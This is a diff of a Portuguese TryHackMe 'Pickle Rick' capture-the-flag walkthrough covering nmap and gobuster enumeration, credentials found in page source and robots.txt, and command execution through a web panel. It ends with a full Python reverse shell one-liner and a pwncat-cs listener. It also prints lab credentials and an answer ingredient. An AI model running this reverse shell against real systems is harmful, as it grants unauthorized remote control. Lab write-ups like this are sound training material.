@@ -3,7 +3,7 @@ layout:
   title:
     visible: true
   description:
-    visible: true
+    visible: false
   tableOfContents:
     visible: true
   outline:
@@ -20,29 +20,35 @@ Para começarmos, iremos nos conectar ao servidor VPN do TryHackMe usando o segu
 
 Primeiramente, iremos fazer um scan nas portas abertas do host alvo, ou seja, o IP que o TryHackMe nos proporciona.
 
-Utilizando o nmap, nós iremos fazer uma varredura nas portas até um determinado número que irei definir como 10000.
+Utilizando o nmap, nós iremos fazer uma varredura nas portas até um determinado número que irei definir como 10000.0
+
+Mas primeiro para que o nmap serve?
+
+```bash
+nmap -p 10000 -sV -sC IP-DO-TRYHACKME
+```
 
 <figure><img src=".gitbook/assets/image2.png" alt=""><figcaption><p>image2</p></figcaption></figure>
 
-Agora, irei explicar para que os comandos servem:
+**Agora, irei explicar para que os comandos servem:**
 
-O -p serve para você selecionar uma quantidade de portas, podendo ser default ou um número específico colocado logo após, como no caso -p -10000. O - antes do 10000 é uma abreviação para definir que é de 0 até 10000.
-
-O -sV serve para determinar a versão dos serviços que estão abertos nas portas.
-
-O -sC serve para executar um script automático do nmap para dar detalhes sobre os serviços e detectar possíveis vulnerabilidades.
+* O **-p** serve para você selecionar uma quantidade de portas, podendo ser default ou um número específico colocado logo após, como no caso -p -10000. O - antes do 10000 é uma abreviação para definir que é de 0 até 10000.
+* O **-sV** serve para determinar a versão dos serviços que estão abertos nas portas.
+* O **-sC** serve para executar um script automático do nmap para dar detalhes sobre os serviços e detectar possíveis vulnerabilidades.
 
 Após o nmap escanear as portas abertas, podemos perceber que temos 2 portas abertas: a porta 22/tcp com o serviço SSH e a porta 80/tcp com o serviço HTTP.
 
 <figure><img src=".gitbook/assets/image3.png" alt=""><figcaption><p>image3</p></figcaption></figure>
 
-Primeiro, irei explicar o que é uma porta aberta. Uma porta aberta significa que a porta está aceitando conexões de entrada, lembrando que uma porta é um ponto virtual onde começam e terminam as conexões de rede, ou seja, tem algum aplicativo lá que está pronto ou está recebendo dados de entrada.
+**Primeiro, irei explicar o que é uma porta aberta.**&#x20;
 
-Também temos as portas gerais que se referem a uma porta A "porta geral" se refere a uma porta específica em um dispositivo de rede usada para um serviço bem conhecido. Essas portas são designadas pela IANA para serviços específicos:
+* Uma **Porta Aberta** significa que a porta está aceitando conexões de entrada, lembrando que uma porta é um ponto virtual onde começam e terminam as conexões de rede, ou seja, tem algum aplicativo lá que está pronto ou está recebendo dados de entrada.
+
+Também temos as portas gerais. A "porta geral" se refere a uma porta específica em um dispositivo de rede usada para um serviço bem conhecido. Essas portas são designadas pela IANA para serviços específicos:
 
 * Porta 80: HTTP (Hypertext Transfer Protocol)
 * Porta 443: HTTPS (HTTP Secure)
-* Porta 22 (geralmente, mas não exclusivamente): SSH (Secure Shell)
+* Porta 22: SSH (Secure Shell)
 * Porta 25: SMTP (Simple Mail Transfer Protocol)
 * Porta 21: FTP (File Transfer Protocol)
 
@@ -52,13 +58,20 @@ Além disso, cada protocolo opera em camadas distintas. Por exemplo, o HTTP e o 
 
 <figure><img src=".gitbook/assets/camadas.png" alt=""><figcaption><p>Exemplo Camadas</p></figcaption></figure>
 
-Agora, vamos ver o que é TCP. O TCP, ou Transmission Control Protocol, é um protocolo de rede que os computadores usam para enviar ou receber informações, garantindo a entrega confiável das informações. E o protocolo UDP, ou User Datagram Protocol, tem a mesma função de transmitir informações entre computadores, porém, enquanto o Protocolo TCP é mais confiável e seguro ao transmitir informações, ele acaba sendo mais lento. Então, para aplicativos que exigem uma eficiência maior e com menos preocupação na entrega das informações, utiliza-se o UDP.
+**Agora, vamos ver o que é TCP.**&#x20;
 
-Agora que sabemos sobre as portas e como são transmitidas as informações, vamos ver os serviços.
+* O **TCP**, ou Transmission Control Protocol, é um protocolo de rede que os computadores usam para enviar ou receber informações, garantindo a entrega confiável das informações.&#x20;
+* O **UDP**, ou User Datagram Protocol, tem a mesma função de transmitir informações entre computadores, porém, enquanto o Protocolo TCP é mais confiável e seguro ao transmitir informações, ele acaba sendo mais lento. Então, para aplicativos que exigem uma eficiência maior e com menos preocupação na entrega das informações, utiliza-se o UDP.
 
-O SSH, ou Secure Shell, é um protocolo de comunicação entre dois dispositivos dentro da rede, geralmente o cliente (sua máquina) e o servidor (onde está hospedado o serviço). Ele é normalmente usado para acessar e controlar remotamente dispositivos, principalmente servidores, de forma segura e com uma conexão criptografada.
+**Agora que sabemos sobre as portas e como são transmitidas as informações, vamos ver os serviços.**
 
-O HTTP, ou Hypertext Transfer Protocol, é um protocolo de comunicação utilizado para transferir dados pela World Wide Web. Ele é o principal protocolo utilizado para acessar e enviar informações em páginas da web.
+* O **SSH**, ou Secure Shell, é um protocolo de comunicação entre dois dispositivos dentro da rede, geralmente o cliente (sua máquina) e o servidor (onde está hospedado o serviço). Ele é normalmente usado para acessar e controlar remotamente dispositivos, principalmente servidores, de forma segura e com uma conexão criptografada.
+
+<figure><img src=".gitbook/assets/criptografia-simetrica-ssh-hostinger.webp" alt=""><figcaption><p>SSH Demonstração</p></figcaption></figure>
+
+* O **HTTP,** ou Hypertext Transfer Protocol, é um protocolo de comunicação utilizado para transferir dados pela World Wide Web. Ele é o principal protocolo utilizado para acessar e enviar informações em páginas da web.
+
+<figure><img src=".gitbook/assets/HTTP funcionamento.png" alt=""><figcaption><p>HTTP Demonstração</p></figcaption></figure>
 
 Caso queiram se aprofundar sobre: [https://www.cloudflare.com/pt-br/learning/network-layer/what-is-a-computer-port/](https://www.cloudflare.com/pt-br/learning/network-layer/what-is-a-computer-port/)
 
@@ -70,17 +83,21 @@ Quase me esqueci, o motivo de eu ter escolhido primeiro ir atrás do site é por
 
 Agora, nós iremos ver se o site tem algum diretório ou caminho escondido utilizando o Gobuster.
 
+```bash
+gobuster -u http://IP-DO-TRYHACKME/ -m CAMINHO-ATÉ-A-WORDLIST -x php,js,css,html,txt,cgi
+```
+
 <figure><img src=".gitbook/assets/image5.png" alt=""><figcaption><p>image5</p></figcaption></figure>
 
-O Gobuster serve para fazer um ataque de força bruta e de enumeração em servidores web, ou seja, ele vai atrás de diretórios ou caminhos ocultos em um servidor web, tentando acessar várias URLs dentro daquele servidor. Exemplo: http://localhost/ - essa seria a URL padrão, o Gobuster tentaria acessá-la várias vezes colocando mais finais, como http://localhost/login, http://localhost/password, http://localhost/index, até conseguir encontrar algo ou então até terminar a wordlist (lista de palavras) que você colocou.
+**Mas para que serve o Gobuster?**
 
-Agora, vamos ver para que serve os comandos utilizados:
+* O **Gobuster** serve para fazer um ataque de força bruta e de enumeração em servidores web, ou seja, ele vai atrás de diretórios ou caminhos ocultos em um servidor web, tentando acessar várias URLs dentro daquele servidor. Exemplo: http://localhost/ - essa seria a URL padrão, o Gobuster tentaria acessá-la várias vezes colocando mais finais, como http://localhost/login, http://localhost/password, http://localhost/index, até conseguir encontrar algo ou então até terminar a wordlist (lista de palavras) que você colocou.
 
-O -u serve para você colocar qual a URL do servidor web.
+**Sabendo para que serve, vamos ver para que serve os comandos utilizados:**
 
-O -w é para colocar o caminho para a wordlist (lista de palavras) que você estará usando. No meu caso, estou usando a directory-list-2.3-medium (só jogar no Google e colocar "github" no final que você acha).
-
-O -x é para extensão do arquivo, ou seja, a terminação como, por exemplo, index.html ou então login.php.
+* O **-u** serve para você colocar qual a URL do servidor web.
+* O **-w** é para colocar o caminho para a wordlist (lista de palavras) que você estará usando. No meu caso, estou usando a directory-list-2.3-medium (só jogar no Google e colocar "github" no final que você acha).
+* O **-x** é para extensão do arquivo, ou seja, a terminação como, por exemplo, index.html ou então login.php.
 
 <figure><img src=".gitbook/assets/image6.png" alt=""><figcaption><p>image6</p></figcaption></figure>
 
@@ -100,17 +117,17 @@ Após usarmos portal.php voltamos para a mesma página do login.php.
 
 <figure><img src=".gitbook/assets/image9.png" alt=""><figcaption><p>image9</p></figcaption></figure>
 
-No robots.txt, achamos algo, mas não sabemos se iremos utilizar, mas sempre é bom guardar. - Wubbalubbadubdub
+No robots.txt, achamos algo, mas não sabemos se iremos utilizar, mas sempre é bom guardar, **Wubbalubbadubdub**.
 
 <figure><img src=".gitbook/assets/image10.png" alt=""><figcaption><p>image10</p></figcaption></figure>
 
 Olhamos tudo e percebemos que precisamos de um login e uma senha, pode ser que a palavra achada no robots.txt seja ou o login ou a senha. Como não encontramos mais nada na parte visual, iremos dar uma inspecionada no código por trás das páginas.
 
-Voltando ao index.html, não conseguimos muitas informações na parte visual, então vamos dar uma inspecionada nele usando o F12 no Chrome e então, BINGO! Temos um login. - R1ckRul3s
+Voltando ao index.html, não conseguimos muitas informações na parte visual, então vamos dar uma inspecionada nele usando o F12 no Chrome e então, BINGO! Temos um login, **R1ckRul3s**.
 
 <figure><img src=".gitbook/assets/image11.png" alt=""><figcaption><p>image11</p></figcaption></figure>
 
-Após olharmos as outras, não encontramos nada.... mas peraí, nós temos aquela palavra esquisita colocada no robots.txt, então entramos no /login.php e colocamos o login: R1ckRul3s e a senha: Wubbalubbadubdub e então KATCHAU!! Conseguimos entrar.
+Após olharmos as outras, não encontramos nada.... mas peraí, nós temos aquela palavra esquisita colocada no robots.txt, então entramos no /login.php e colocamos o login: **R1ckRul3s** e a senha: **Wubbalubbadubdub** e então KATCHAU!! Conseguimos entrar.
 
 <figure><img src=".gitbook/assets/image12.png" alt=""><figcaption><p>image12</p></figcaption></figure>
 
@@ -118,7 +135,7 @@ Após entrarmos, podemos ver que temos um tal de Command Panel, poderia ser que 
 
 <figure><img src=".gitbook/assets/image13.png" alt=""><figcaption><p>image13</p></figcaption></figure>
 
-Vamos dar uma checada em cada um... no primeiro, conseguimos algo. Temos que o super ingrediente secreto é o mr. meeseek hair, vamos guardar essa informação.
+Vamos dar uma checada em cada um... no primeiro, conseguimos algo. Temos que o super ingrediente secreto é o **mr. meeseek hair**, vamos guardar essa informação.
 
 <figure><img src=".gitbook/assets/image14.png" alt=""><figcaption><p>image14</p></figcaption></figure>
 
@@ -140,7 +157,41 @@ Após alguns testes, vemos que podemos usar o Python3 no terminal.
 
 <figure><img src=".gitbook/assets/image18.png" alt=""><figcaption><p>image18</p></figcaption></figure>
 
-Então, vamos fazer um reverse secure shell, procurando um pouco, nós achamos o Python reverse shell no Pentestmonkey. - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("SEU IP", PORTA PARA SE ABRIR));os.dup2(s.fileno(),0); os.d
+**Então, vamos fazer um Reverse Shell, mas primeiro vamos ver o que é um Reverse  Shell.**
 
-<figure><img src=".gitbook/assets/image19.png" alt=""><figcaption><p>image19</p></figcaption></figure>
+* **Reverse Shell** é uma técnica onde o Atacante consegue estabelecer uma conexão de rede de saída, ou seja, o host que envia a conexão para o seu computador. Isso normalmente é utilizado quando o alvo está por trás de um firewall ou de outras medidas de segurança que bloqueiam conexões de entrada.
+
+<figure><img src=".gitbook/assets/Reverse Shell in action.jpg" alt=""><figcaption><p>Reverse Shell Demonstração</p></figcaption></figure>
+
+**Agora que sabemos o que é um Reverse Shell como iremos fazer um?**&#x20;
+
+Existem várias maneiras de fazer um Reverse Shell, mas no nosso caso nos já temos acesso a um Shell(Terminal) que está rodando no Servidor alvo, ou seja nos temos que configurar um servidor para receber a conexão de saída do Servidor, para isso iremos utilizar o pwncat-cs.
+
+**Mas primeiro o que é o pwncat-cs?**
+
+* O **pwncat-cs** é uma ferramenta de linha de comando para criar conexões de rede seguras, permitindo comunicações protegidas por criptografia.
+
+```bash
+pwncat-cs -p 9999
+```
+
+<figure><img src=".gitbook/assets/image23.png" alt=""><figcaption><p>image19</p></figcaption></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+```sh
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("SEU-IP´", PORTA-PARA-SE-ABRIR));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+<figure><img src=".gitbook/assets/image19.png" alt=""><figcaption><p>image</p></figcaption></figure>
 
